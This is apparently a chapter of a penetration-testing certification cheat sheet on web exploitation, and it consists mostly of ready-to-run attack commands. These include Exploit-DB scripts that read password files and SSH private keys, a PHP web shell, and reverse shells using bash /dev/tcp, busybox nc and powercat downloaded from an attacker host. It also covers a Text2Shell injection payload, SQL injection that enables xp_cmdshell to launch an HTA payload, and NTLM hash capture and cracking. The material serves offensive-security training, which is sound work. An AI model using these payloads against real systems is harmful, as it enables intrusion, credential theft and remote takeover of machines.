# 02 - Web Exploitation

Index
- [Exploit DB](#Exploit-DB)
- [Example: Local File Inclusion](#Example-Local-File-Inclusion)
    - [ID 50383 CVE-2021-41773](#ID-50383-CVE-2021-41773)
    - [ID 50420 CVE-2020-11738](#ID-50420-CVE-2020-11738)
    - [ID 50616 File Upload](#ID-50616-File-Upload)
- [Example: reverse shell](#Example-reverse-shell)
    - [ID 48793 CVE-2020-14008](#ID-48793-CVE-2020-14008)
    - [Local File Inclusion](#Local-File-Inclusion)
    - [ID 49488 RCE and Reverse Shell](#ID-49488-RCE-and-Reverse-Shell)
    - [Text2Shell](#Text2Shell)
- [Example: sqli](#Example-sqli)
    - [MSSQL Error, UNION SELECT, reverse shell](#MSSQL-Error-UNION-SELECT-reverse-shell)
- [Example: NTML relay](#Example-NTLM-relay)
    - [URL or PATH fiels](#URL-or-PATH-fiels)

## Exploit DB
Exploit search command example: searchsploit $software $version
``` bash
searchsploit apache 2.4.49
------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                 |  Path
------------------------------------------------------------------------------- ---------------------------------
...
Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)       | multiple/webapps/50383.sh
...
------------------------------------------------------------------------------- ---------------------------------
```

Copy exploit on disk:
``` bash
searchsploit -m multiple/webapps/50383.sh
```

## Example: Local File Inclusion
### ID 50383 CVE-2021-41773
``` bash
bash 50383.sh ./targets.txt /etc/passwd                 ## read file passwd, user enum
bash 50383.sh ./targets.txt /etc/ssh/*pub               ## search ecdsa key
bash 50383.sh ./targets.txt /home/$user/.ssh/id_ecdsa   ## read ecdsa key, possible ssh access
bash 50383.sh ./targets.txt /home/$user/.ssh/id_rsa     ## read rsa key, possible ssh access
```

### ID 50420 CVE-2020-11738
Wordpress Plugin Duplicator 1.3.26:
``` bash
python3 50420.py http://192.168.1.1 /etc/passwd             ## read file passwd, user enum
python3 50420.py http://192.168.1.1 /home/$user/.ssh/id_rsa ## read rsa key, possible ssh access
```

### ID 50616 File Upload
RiteCMS RCE:
- Need valid credentials (ex: admin/admin) to upload a php shell (shell.pHP)
- Need to change the .php extension in .pHP or similar.
``` php
<?php echo system($_GET['cmd']); ?>                         ## shell.pHP
```
Check the RCE:
``` bash
curl http://192.168.1.1:8000/cms/files/shell.pHP?cmd=whoami ## for windows
curl http://192.168.1.1:8000/cms/files/shell.pHP?cmd=id     ## for linux
```
Windows Reverse Shell (powercat.ps1 based):
``` bash
### exploit                                          ### command               ### reverse shell                                    ### KALI                        ### require nc listener: nc -nvlp 443
curl http://192.168.1.1:8000/cms/files/shell.pHP?cmd=powershell -nop -w hidden IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI:8888/powercat.ps1');powercat -c $KALI -p 443 -e powershell
```

## Example: reverse shell
### ID 48793 CVE-2020-14008
ManageEngine reverse shell (auth):
``` bash
python3 48793.py https://192.168.1.1:8443 admin admin $KALI_IP $PORT    ## require nc listener: nc -nvlp 443
```

### Local File Inclusion
Initial access was gained via SSH; an internal web app was running as root.
Unsecure LFI in application script.

Create a reverse shell command file:
``` php
<?php system('bash -c "bash -i >& /dev/tcp/$KALI/443 0>&1"'); ?>         ## require nc listener: nc -nvlp 443
```
Get the vulnerable script from interna (or external if possible):
``` bash
curl http://127.0.0.1:8000/backend/?view=../../../../../../../../home/user/shell.php
```

### ID 49488 RCE and Reverse Shell
Umbraco 7.14 RCE p-o-c:
``` bash
python3 49488.py -u $user -p $password -i 'http://192.168.1.1' -c whoami
```
Exploit + Reverse Shell Payload (powercat based):
``` bash
### exploit                                                    ### command   ### reverse shell as argument                            ### KALI                    ### require nc listener: nc -nvlp 443
python3 49488.py -u $user -p $password -i 'http://192.168.1.1' -c powershell -a "IEX(New-Object System.Net.WebClient).DownloadString('http://$KALI/powercat.ps1');powercat -c $KALI -p 443 -e powershell"
```

### Text2Shell
API with "Apache Commons Text 1.8" library:
``` bash
# vulnerable target
http://192.168.1.1:8888/search?query=TEXT

# exploit                            # need URL encoding   
http://192.168.1.1:8888/search?query=${script:javascript:java.lang.Runtime.getRuntime().exec('PAYLOAD')}

# payload -- try all reverse shell in https://www.revshells.com/ :-(
${script:javascript:java.lang.Runtime.getRuntime().exec('busybox nc 192.168.1.1 1337 -e /bin/bash')}
# encoded version
%24%7Bscript%3Ajavascript%3Ajava%2Elang%2ERuntime%2EgetRuntime%28%29%2Eexec%28%27busybox%20nc%20192%2E168%2E1%2E1%201337%20%2De%20%2Fbin%2Fbash%27%29%7D
```

## Example: sqli

### MSSQL Error, UNION SELECT, reverse shell
Check available fields:
``` text
admin' UNION SELECT 1,2,3,4,5--+
admin' UNION SELECT 1,2,3,4--+
admin' UNION SELECT 1,2,3--+
admin' UNION SELECT 1,2--+
```

Enable xp_cmdshell:
``` text
admin' UNION SELECT 1,2; EXEC sp_configure 'show advanced options', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
admin' UNION SELECT 1,2; EXEC sp_configure 'xp_cmdshell', 1--+
admin' UNION SELECT 1,2; RECONFIGURE--+
```

HTA_listener:
``` bash
msf6 > use exploit/windows/misc/hta_server
msf6 exploit(windows/misc/hta_server) > set LHOST $KALI     ## set attacker IP
LHOST => $KALI
msf6 exploit(windows/misc/hta_server) > exploit
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.
msf6 exploit(windows/misc/hta_server) > 
[*] Started reverse TCP handler on 192.168.45.226:4444 
[*] Using URL: http://$KALI:8888/Kl4Su1ud80QLi.hta          ## HTA url, reverse shell target
[*] Server started.
```

Exploiting:
``` text
admin' UNION SELECT 1,2; EXEC xp_cmdshell 'mshta.exe http://$KALI:8888/Kl4Su1ud80QLi.hta'--+
```

## Example: NTML relay

### URL or PATH fiels
Scenario: there is a FIELD in the web app to URL or other PATH and the application test the PATH on the submit.
Verify the URL/PATH test with and interna HTTP server (ex: python3 -m http.server) or other impacket tools (ex: impacket-smbserver TMP /tmp).

#### Get NTLMv2 hash:
Start responder:
``` bash
sudo responder -I tun0
```
Use the web application to the the URL/PATH request:
![webapp](https://github.com/roccosicilia/OSCP_cheatsheet/blob/main/assets/webapp-path-test.png?raw=true "webapp")

Get the NTLM hash:
``` text
[SMB] NTLMv2-SSP Client   : 192.168.1.1
[SMB] NTLMv2-SSP Username : DOMAIN\test_user
[SMB] NTLMv2-SSP Hash     : test_user::DOMAIN:00000000000000000000000000000000...
```

Crack the hash:
``` bash
hashcat -m 5600 file.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

### From MSSQL cli
